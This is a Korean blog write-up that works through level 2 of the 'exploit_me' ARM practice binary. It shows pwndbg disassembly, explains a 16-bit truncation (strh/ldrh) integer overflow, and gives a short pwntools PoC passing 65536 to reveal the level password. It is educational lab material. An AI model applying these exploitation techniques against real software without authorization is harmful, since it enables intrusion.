---
title: "[pwnable] ARM exploit 정리"
excerpt: "exploit_me"

categories:
  - pwn
tags:
  - [pwnable, exploit]

permalink: /pwn/exploit_me/

toc: true
toc_sticky: true

date: 2024-12-18
last_modified_at: 2024-12-18
---

github에 arm exploit을 정리하기에 좋은 예제가 있어서 이를 이용해서 정리해보고자 합니다.

👉🏻 [exploit_me](https://github.com/bkerler/exploit_me.git)

m1 mac에서 진행하지만 pwnable 환경 자체가 linux x64 환경이기 때문에 qemu를 이용하여 진행하였습니다.

👉🏻 [qemu 정리](https://parkhoho.github.io/pwn/qemu/)

## ☝🏻 정수 오버플로우
main을 disassemble해보면 int_overflow 함수를 찾을 수 있다.

이 함수가 level2 password의 힌트다.
> 참고로 level1 password의 경우 바이너리를 실행시키면 찾을 수 있다.

```
qemu-aarch64-static -L /usr/aarch64-linux-gnu/ -g 8888 ./exploit64 hello 11111
```

11111이라는 값을 줬고, 이 11111을 어떻게 처리하는지 살펴보자.



```asm
0x0000000000401490 <+0>:	stp	x29, x30, [sp, #-48]!
0x0000000000401494 <+4>:	mov	x29, sp
0x0000000000401498 <+8>:	str	x0, [sp, #24]
0x000000000040149c <+12>:	ldr	x0, [sp, #24]
0x00000000004014a0 <+16>:	bl	0x4171b8 <atoi>
0x00000000004014a4 <+20>:	str	w0, [sp, #44]
0x00000000004014a8 <+24>:	ldr	w0, [sp, #44]
0x00000000004014ac <+28>:	str	w0, [sp, #40]
0x00000000004014b0 <+32>:	ldr	w0, [sp, #40]
0x00000000004014b4 <+36>:	cmp	w0, #0x0
0x00000000004014b8 <+40>:	b.ne	0x4014d0 <_Z12int_overflowPc+64>  // b.any
0x00000000004014bc <+44>:	adrp	x0, 0x470000 <_nl_archive_subfreeres+104>
0x00000000004014c0 <+48>:	add	x0, x0, #0x7e8
0x00000000004014c4 <+52>:	bl	0x425e30 <puts>
0x00000000004014c8 <+56>:	mov	w0, #0x0                   	// #0
0x00000000004014cc <+60>:	bl	0x417b30 <exit>
0x00000000004014d0 <+64>:	ldr	w0, [sp, #44]
0x00000000004014d4 <+68>:	strh	w0, [sp, #38]
0x00000000004014d8 <+72>:	ldrh	w0, [sp, #38]
0x00000000004014dc <+76>:	cmp	w0, #0x0
0x00000000004014e0 <+80>:	b.eq	0x401500 <_Z12int_overflowPc+112>  // b.none
0x00000000004014e4 <+84>:	ldrh	w0, [sp, #38]
0x00000000004014e8 <+88>:	mov	w1, w0
0x00000000004014ec <+92>:	adrp	x0, 0x470000 <_nl_archive_subfreeres+104>
```


int_overflow의 disassemble한 코드다.

1. `stp x29,x30,[sp,#-48]!` `mov x29,sp`를 통해 스택 정리
2. `str x0,[sp,#24]`,`ldr x0,[sp,#24]`를 통해 값을 가져온다.
3. atoi를 이용하여 값을 읽음
4. 이 값을 0과 비교하여 같지 않으면 첫번째 branch를 통가하게 된다.(같으면 exit)
5. 이후 다시 재배열한 값을 가져와서 0과 같으면 jmp 한다.(0과 같지 않으면 exit)
6. 즉, 입력한 값이 0이거나 0보다 작아야 한다.


이때 11111를 통해 내부에서 어떤 결과가 나오는지 확인해보자.


```bash
b *int_overflow
c
```

이때 나오는 결과는 아래와 같다.

```assembly
  0x401490 <int_overflow(char*)>       stp    x29, x30, [sp, #-0x30]!       <main+224>
  0x401494 <int_overflow(char*)+4>     mov    x29, sp
  0x401498 <int_overflow(char*)+8>     str    x0, [sp, #0x18]
  0x40149c <int_overflow(char*)+12>    ldr    x0, [sp, #0x18]
  0x4014a0 <int_overflow(char*)+16>    bl     #atoi                     <atoi>

  0x4014a4 <int_overflow(char*)+20>    str    w0, [sp, #0x2c]
  0x4014a8 <int_overflow(char*)+24>    ldr    w0, [sp, #0x2c]
  0x4014ac <int_overflow(char*)+28>    str    w0, [sp, #0x28]
  0x4014b0 <int_overflow(char*)+32>    ldr    w0, [sp, #0x28]
  0x4014b4 <int_overflow(char*)+36>    cmp    w0, #0
  0x4014b8 <int_overflow(char*)+40>    b.ne   #int_overflow(char*)+64                     <int_overflow(char*)+64>
  ...
```


이때 아까 설명한 조건들을 우회하기 위해 breakpoint를 다음과 같이 준다.
```
b *int_overflow+40
b *int_overflow+80
b *int_overflow+120
```


continue 한 후에 w0의 값을 확인해보자.

```bash
c
```

```bash
pwndbg> info r w0
w0             0x2b67              11111
```


즉 w0에는 11111의 hex값인 0x2b67이 들어가 있다.


따라서 w0이 0보다 크기 때문에 jmp를 하게 된다.

다음 조건으로는 그 값을 다시 가져와 0과 비교를 하게 된다.


이때 w0은 아까와 마찬가지로 0x2b67이 들어가있기 때문에 jmp를 하지 못한다.


따라서 다음과 같이 printf()와 exit를 만나 프로그램이 종료가 된다.

```assembly
0x4014e4 <int_overflow(char*)+84>     ldrh   w0, [sp, #0x26]
 ► 0x4014e8 <int_overflow(char*)+88>     mov    w1, w0
   0x4014ec <int_overflow(char*)+92>     adrp   x0, #_nl_archive_subfreeres+104 <0x470000>
   0x4014f0 <int_overflow(char*)+96>     add    x0, x0, #0x810
   0x4014f4 <int_overflow(char*)+100>    bl     #printf                     <printf>

   0x4014f8 <int_overflow(char*)+104>    mov    w0, #0
   0x4014fc <int_overflow(char*)+108>    bl     #exit                     <exit>
```

즉, 원하는 값을 얻기 위해서는 w0에 0을 넣어야 한다.
하지만 입력값에 0을 넣게 되면 password를 얻지 못하기 때문에 다른 방식을 사용해야 한다.

## 해결방법
다음은 int_overflow의 동작과정 중 하나이다.

이때 `strh`와 `ldrh` 명령어를 통해 w0에 특정 값을 저장하고 있는 것을 확인할 수 있다.

```assembly
0x4014d0 <int_overflow(char*)+64>    ldr    w0, [sp, #0x2c]
0x4014d4 <int_overflow(char*)+68>    strh   w0, [sp, #0x26]
0x4014d8 <int_overflow(char*)+72>    ldrh   w0, [sp, #0x26]
► 0x4014dc <int_overflow(char*)+76>    cmp    w0, #0
0x4014e0 <int_overflow(char*)+80>    b.eq   #int_overflow(char*)+112                     <int_overflow(char*)+112>
```

`strh`과 `ldrh`는 halfword 크기만큼을 저장하고 로드하는 명령어다.

👉🏻 [참고](https://developer.arm.com/documentation/ddi0406/c/Application-Level-Architecture/Instruction-Details/Alphabetical-list-of-instructions/LDRH--immediate--Thumb-?lang=en)


그렇기에 2^16 값을 넣게 된다면 0이 저장되게 된다.


다음은 2^16을 입력으로 하여 바이너리를 분석한 결과다.

```
pwndbg> b *int_overflow+80
```

```
0x4014cc <int_overflow(char*)+60>     bl     #exit                     <exit>

   0x4014d0 <int_overflow(char*)+64>     ldr    w0, [sp, #0x2c]
   0x4014d4 <int_overflow(char*)+68>     strh   w0, [sp, #0x26]
   0x4014d8 <int_overflow(char*)+72>     ldrh   w0, [sp, #0x26]
   0x4014dc <int_overflow(char*)+76>     cmp    w0, #0
 ► 0x4014e0 <int_overflow(char*)+80>     b.eq   #int_overflow(char*)+112                     <int_overflow(char*)+112>
    ↓
   0x401500 <int_overflow(char*)+112>    ldr    w0, [sp, #0x2c]
   0x401504 <int_overflow(char*)+116>    cmp    w0, #0
   0x401508 <int_overflow(char*)+120>    b.lt   #int_overflow(char*)+136                     <int_overflow(char*)+136>

   0x40150c <int_overflow(char*)+124>    ldrh   w0, [sp, #0x26]
   0x401510 <int_overflow(char*)+128>    cmp    w0, #0
```

```bash
pwndbg> info r w0
w0             0x0                 0
```

## PoC
Expoit Code를 제작해보자.
```python
~
"exploit.py" 15L, 317B                                        7,0-1         All
from pwn import *

def lv1():
    args_lv1 = "65536"
    p = process(['./exploit64', 'hello', args_lv1])
    print(p.recvline())

if __name__ == "__main__":
    lv1()
```
```bash
hoho@hoho:~/exploit_me/bin$ python3 ./exploit.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/hoho/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.13.1)
[+] Starting local process './exploit64': pid 1515
b'Level 2 Password: "help"\n'
[*] Stopped process './exploit64' (pid 1515)
```

위와 같이 Level 2 Password를 확인할 수 있다.
